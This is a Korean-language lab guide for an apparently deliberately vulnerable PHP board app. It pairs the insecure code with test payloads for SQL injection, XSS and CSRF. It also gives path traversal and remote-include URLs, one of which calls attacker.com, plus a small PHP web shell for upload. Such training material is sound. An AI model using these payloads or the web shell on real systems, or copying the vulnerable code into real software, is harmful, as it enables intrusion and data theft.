 # 보안 취약점 테스트 가이드

이 문서는 프로젝트에 존재하는 다양한 보안 취약점을 테스트하는 방법을 안내합니다.

---

## 1. SQL Injection (SQL 삽입)

- **취약한 파일**: `web/board.php`
- **설명**: 사용자의 입력값이 SQL 쿼리에 직접 삽입되어 데이터베이스를 조작할 수 있습니다. `board.php`에서 게시글을 작성할 때, 입력 내용이 필터링 없이 쿼리에 포함되어 취약점이 발생합니다.
- **취약한 코드**:
  ```php
  $content = $_POST['content'];
  $username = $_SESSION['username'];
  $sql = "INSERT INTO board (username, content) VALUES ('$username', '$content')"; // SQL Injection
  ```
- **실습 방법**:
  1. 로그인 후 게시판에 접속합니다.
  2. 게시글 내용에 다음과 같은 SQL 쿼리를 입력하여 다른 사용자의 게시글을 강제로 수정합니다.
     ```sql
     ', content = 'Hacked' WHERE id = 1; -- 
     ```

---

## 2. XSS (Cross-Site Scripting)

- **취약한 파일**: `web/board.php`
- **설명**: 사용자가 입력한 스크립트가 필터링 없이 그대로 데이터베이스에 저장되고, 다른 사용자의 웹 브라우저에서 실행되어 세션 탈취 등의 공격이 가능합니다.
- **취약한 코드**:
  ```php
  echo $row["content"]; // XSS
  ```
- **실습 방법**:
  1. 로그인 후 게시판에 접속합니다.
  2. 게시글 내용에 악성 스크립트를 포함하여 작성합니다.
     ```html
     <script>alert('XSS Attack!');</script>
     ```
  3. 해당 게시글을 다른 사용자가 조회하면, 해당 사용자의 브라우저에서 스크립트가 실행됩니다.

---

## 3. CSRF (Cross-Site Request Forgery)

- **취약한 파일**: `web/board.php`
- **설명**: 게시글 작성 폼에 CSRF 토큰이 없어, 공격자가 만든 악성 페이지를 통해 로그인된 사용자가 자신도 모르게 게시글을 작성하게 만들 수 있습니다.
- **실습 방법**:
  1. 공격자는 다음과 같은 HTML 코드로 악성 웹 페이지를 제작합니다.
     ```html
     <html>
       <body>
         <form action="http://localhost/board.php" method="POST">
           <input type="hidden" name="content" value="CSRF Attack Post" />
         </form>
         <script>document.forms[0].submit();</script>
       </body>
     </html>
     ```
  2. 로그인된 사용자가 이 페이지를 방문하면, 자동으로 "CSRF Attack Post"라는 내용의 게시글이 작성됩니다.

---

## 4. Directory Traversal, LFI, RFI

- **취약한 파일**: `web/file_viewer.php`
- **설명**: 파일 경로에 대한 검증이 없어, 사용자가 서버의 다른 디렉토리에 있는 파일에 접근하거나, 원격 서버의 파일을 포함시켜 실행할 수 있습니다.
- **취약한 코드**:
  ```php
  $file = $_GET['file'];
  include($file);
  ```
- **실습 방법**:
  - **Directory Traversal / LFI (로컬 파일 포함)**:
    ```
    http://localhost/file_viewer.php?file=../../../../etc/passwd
    ```
  - **RFI (원격 파일 포함)**: `php.ini`에서 `allow_url_include=On` 설정이 필요합니다.
    ```
    http://localhost/file_viewer.php?file=http://attacker.com/evil.txt
    ```

---

## 5. Unrestricted File Upload (악성 파일 업로드)

- **취약한 파일**: `web/upload.php`
- **설명**: 파일 업로드 시 확장자나 파일 타입을 검사하지 않아, 공격자가 웹 쉘과 같은 악성 스크립트 파일을 업로드하여 서버에서 임의의 명령을 실행할 수 있습니다.
- **실습 방법**:
  1. `shell.php`와 같은 간단한 웹 쉘을 준비합니다.
     ```php
     <?php
       if (isset($_GET['cmd'])) {
         system($_GET['cmd']);
       }
     ?>
     ```
  2. `upload.php` 페이지를 통해 이 파일을 업로드합니다.
  3. 업로드된 쉘 파일에 접속하여 `cmd` 파라미터로 시스템 명령어를 실행합니다.
     ```
     http://localhost/uploads/shell.php?cmd=ls%20-l
     ```
